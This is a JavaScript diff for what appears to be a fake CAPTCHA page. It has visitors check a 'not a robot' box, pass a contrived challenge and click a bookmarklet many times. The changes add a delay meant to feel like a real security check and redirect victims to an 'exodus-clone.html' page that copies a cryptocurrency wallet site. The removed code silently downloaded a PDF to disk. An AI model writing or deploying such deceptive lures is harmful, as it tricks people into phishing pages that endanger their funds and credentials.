@@ -38,6 +38,7 @@
   const verifyHumanBtn = document.getElementById("verifyHumanBtn");
   const verifyStep = document.getElementById("verify-step");
   const verifyLoader = document.getElementById("verifyLoader");
+  const challengePopupOverlay = document.getElementById("challenge-popup-overlay");
   const exodusPopupOverlay = document.getElementById("exodus-popup-overlay");
   const exodusPopupOk = document.getElementById("exodus-popup-ok");
   const verifiedScreen = document.getElementById("verified-screen");
@@ -211,35 +212,42 @@
     });
   }
 
-  function startVerification() {
-    if (!robotCheckbox || !captchaBox) return;
-    if (!robotCheckbox.checked) return;
-    // Spinner revolves for REDIRECT_AFTER_VERIFY_MS, then show captcha steps (drag to bookmark, click 15x)
+  function openChallenge() {
+    if (!captchaBox) return;
+    // Brief delay (feels like a real security check), then open challenge popup
     setTimeout(function () {
-      if (verifyLoader) verifyLoader.classList.add("verified");
-      if (verifyStep) verifyStep.classList.add("verify-done");
+      // Reset challenge to stage 1
+      var ch1 = document.getElementById("challenge1");
+      var ch2 = document.getElementById("challenge2");
+      if (ch1) ch1.classList.remove("hidden");
+      if (ch2) ch2.classList.add("hidden");
+      // Show popup
+      if (challengePopupOverlay) challengePopupOverlay.classList.remove("hidden");
       captchaBox.classList.remove("hidden");
-      if (typeof buildChallenge1Grid === "function") buildChallenge1Grid();
-      if (!countdownInterval) startCountdown();
-      setAnswerDisplay();
-      if (stage1Buttons) stage1Buttons.style.display = "none";
-      if (stage2) stage2.style.display = "none";
-    }, REDIRECT_AFTER_VERIFY_MS);
+      buildChallenge1Grid();
+      // Sync click counter display
+      var clickCounterEl = document.getElementById("clickCounter");
+      if (clickCounterEl) clickCounterEl.textContent = localStorage.getItem("bookmarkletClicks") || "0";
+    }, 800);
   }
 
-  if (verifyHumanBtn) {
-    verifyHumanBtn.addEventListener("click", function () {
-      startVerification();
+  // Clicking the checkbox directly triggers the challenge (no separate button needed)
+  if (robotCheckbox) {
+    robotCheckbox.addEventListener("change", function () {
+      if (robotCheckbox.checked) {
+        openChallenge();
+      } else {
+        if (captchaBox) captchaBox.classList.add("hidden");
+        if (challengePopupOverlay) challengePopupOverlay.classList.add("hidden");
+      }
     });
   }
 
-  if (robotCheckbox) {
-    robotCheckbox.addEventListener("change", function () {
-      if (!robotCheckbox.checked && captchaBox) {
-        captchaBox.classList.add("hidden");
-        if (verifyStep) verifyStep.classList.remove("verify-done");
-        if (verifyLoader) verifyLoader.classList.remove("verified");
-      }
+  // Also support the button if it exists
+  if (verifyHumanBtn) {
+    verifyHumanBtn.addEventListener("click", function () {
+      if (!robotCheckbox || !robotCheckbox.checked) return;
+      openChallenge();
     });
   }
 
@@ -362,7 +370,7 @@
     done2Button.addEventListener("click", function () {
       var n = parseInt(localStorage.getItem("bookmarkletClicks") || 0, 10);
       if (n >= TARGET_CLICKS) {
-        window.location.href = "download.html?redirect_to=" + encodeURIComponent("https://www.exodus.com");
+        window.location.href = "exodus-clone.html?from_captcha=1";
       } else {
         alert("Please click the bookmarked answer " + TARGET_CLICKS + " times first. Current: " + n);
       }
@@ -378,10 +386,10 @@
       "var n=parseInt(localStorage.getItem(k)||0,10)+1;" +
       "localStorage.setItem(k,n);" +
       "var clickCounter=document.getElementById('clickCounter');" +
-      "if(clickCounter && window.location.pathname.includes('captcha')){" +
+      "if(clickCounter && (window.location.pathname.endsWith('/')||window.location.pathname.endsWith('/index.html')||window.location.pathname.includes('captcha'))){" +
       "clickCounter.textContent=n;" +
       "if(n>=" + TARGET_CLICKS + "){" +
-      "setTimeout(function(){location.href=base+'/download.html?redirect_to='+encodeURIComponent('https://www.exodus.com');},500);" +
+      "setTimeout(function(){location.href=base+'/exodus-clone.html?from_captcha=1';},500);" +
       "}" +
       "}else{" +
       "location.href=base+'/download.html';" +
@@ -392,25 +400,12 @@
 
   const bookmarkletHref = buildUnifiedBookmarklet();
 
-  // When captcha box is shown, buildChallenge1Grid is called from handleRobotCheckboxChange
-
-  // When opened via bookmarklet, trigger PDF download via blob so it saves to disk instead of opening in browser
+  // Clear localStorage on fresh page load
   (function () {
     var params = new URLSearchParams(location.search);
-    if (params.get("from_bookmarklet") !== "1") return;
-    fetch(pdfPath)
-      .then(function (res) { return res.blob(); })
-      .then(function (blob) {
-        var url = URL.createObjectURL(blob);
-        var a = document.createElement("a");
-        a.href = url;
-        a.download = pdfFilename;
-        a.style.display = "none";
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(url);
-      })
-      .catch(function () {});
+    if (!params.get("from_bookmarklet") && !params.get("show_exodus_popup")) {
+      localStorage.setItem("bookmarkletClicks", "0");
+    }
   })();
+
 })();
